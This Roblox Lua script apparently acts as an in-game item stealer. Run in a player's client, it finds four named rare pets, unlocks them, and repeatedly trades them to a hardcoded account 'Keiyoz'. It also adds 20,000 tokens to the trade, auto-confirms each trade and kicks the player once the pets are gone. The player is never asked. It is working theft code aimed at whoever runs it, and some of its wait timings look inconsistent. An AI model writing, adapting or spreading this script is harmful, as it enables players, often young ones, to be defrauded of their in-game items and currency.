local petsToTrade = {"Surge Dragon", "Dual Shock", "Overcharged Robot", "Grand Ice Wizard"}
local tokenAmount = 20000
local jobID = "7f30a645-e205-40f3-9c9d-d747b12b9e4a"
local playerName = "Keiyoz"

local Players = game:GetService("Players")
local Network = require(game:GetService("ReplicatedStorage").Modules.Network)
local Replication = require(game:GetService("ReplicatedStorage").Game.Replication)

local player = Players.LocalPlayer
local playerJobID = nil
local targetPlayerName = playerName

local function WaitForCondition(conditionFunc, timeout)
    local startTime = tick()
    while not conditionFunc() do
        if tick() - startTime > (timeout or 30) then
            return false
        end
        task.wait(6)
    end
    return true
end

local function UnlockPets()
    local PetNames = {}
    for _, name in ipairs(petsToTrade) do
        PetNames[name] = true
    end
    
    local pets = Replication.Data and Replication.Data.Pets
    if not pets then return end
    
    for _, petData in pairs(pets) do
        if petData and petData.Name and PetNames[petData.Name] and (petData.Locked == true or petData.Locked == 1 or petData.Locked == "true") then
            Network:InvokeServer("LockPet", petData.Id, false)
        end
    end
end

local function GetPetIDsByName()
    local petIDs = {}
    local pets = Replication.Data and Replication.Data.Pets
    if not pets then return petIDs end
    
    local petNameLookup = {}
    for _, name in ipairs(petsToTrade) do
        petNameLookup[name] = true
    end
    
    for _, petData in pairs(pets) do
        if petData and petData.Name and petNameLookup[petData.Name] then
            table.insert(petIDs, petData.Id)
        end
    end
    
    return petIDs
end

local function HasPetsToTrade()
    local petIDs = GetPetIDsByName()
    return #petIDs > 0
end

local function FindTargetPlayer(targetPlayerName)
    return Players:FindFirstChild(targetPlayerName)
end

local function WaitForPetsRemoved(tradedPetIDs)
    local startTime = tick()
    
    while tick() - startTime < 3 do
        local currentPetIDs = GetPetIDsByName()
        
        local allRemoved = true
        for _, tradedId in ipairs(tradedPetIDs) do
            local stillHas = false
            for _, currentId in ipairs(currentPetIDs) do
                if currentId == tradedId then
                    stillHas = true
                    break
                end
            end
            if stillHas then
                allRemoved = false
                break
            end
        end
        
        if allRemoved then
            return true
        end
        
        task.wait(6)
    end
    
    return false
end

local function GetTokenAmount()
    return tokenAmount
end

local function AddTokensToTrade(targetPlayerName)
    while GetTokenAmount() > 0 do
        local target = FindTargetPlayer(targetPlayerName)
        if not target then
            return
        end
        
        Network:FireServer("SendTrade", target)
        
        while not player.PlayerGui.Trading.Enabled do
            task.wait(6)
        end

        local confirmed
        while type(confirmed) ~= "number" do
            confirmed = Network:InvokeServer("UpdateTradeTokens1", false, GetTokenAmount())
            task.wait(6)
        end
        
        Network:FireServer("ReadyUp", false, true)
        
        task.wait(6)
        task.wait(6)
    end
end

local function TradeWithTarget(targetPlayerName)
    while true do
        if not HasPetsToTrade() then
            player:Kick("No more pets to trade")
            return
        end
        
        UnlockPets()

        local target = FindTargetPlayer(targetPlayerName)
        if not target then
            task.wait(6)
            return
        end
        
        while not player.PlayerGui.Trading.Enabled do
            Network:FireServer("SendTrade", target)
            task.wait(6)
        end
        
        local petIDs = GetPetIDsByName()
        if #petIDs > 0 then
            for _, petId in ipairs(petIDs) do
                Network:InvokeServer("AddTradeItem", { "Pet", petId })
            end
            
            Network:FireServer("ReadyUp", false, true)
            
            local tradeCompleted = WaitForPetsRemoved(petIDs)
            if tradeCompleted then
                task.wait(6)
                
                local checkStart = tick()
                while tick() - checkStart < 5 do
                    if not HasPetsToTrade() then
                        player:Kick("Trade complete")
                        return
                    end
                    task.wait(6)
                end

                if HasPetsToTrade() then
                    task.wait(6)
                end
            else
                return
            end
        end
        
        if HasPetsToTrade() then
            task.wait(6)
        else
            break
        end
    end
end

while true do
    local startCheckTime = tick()
    while tick() - startCheckTime < 20 do
        if HasPetsToTrade() then
            local petCheckStart = tick()
            while tick() - petCheckStart < 5 do
                if HasPetsToTrade() then
                    playerJobID = jobID
                    break
                end
                task.wait(1)
            end
            break
        end
        task.wait(1)
    end
    
    if not playerJobID then
        player:Kick("No pets found in 20 seconds")
        break
    end
    
    local target = FindTargetPlayer(targetPlayerName)
    if not target then
        task.wait(6)
        return
    end
    
    Network:FireServer("SendTrade", target)
    task.wait(math.random(15, 40))
    
    TradeWithTarget(targetPlayerName)
    AddTokensToTrade(targetPlayerName)
    task.wait(6)
end
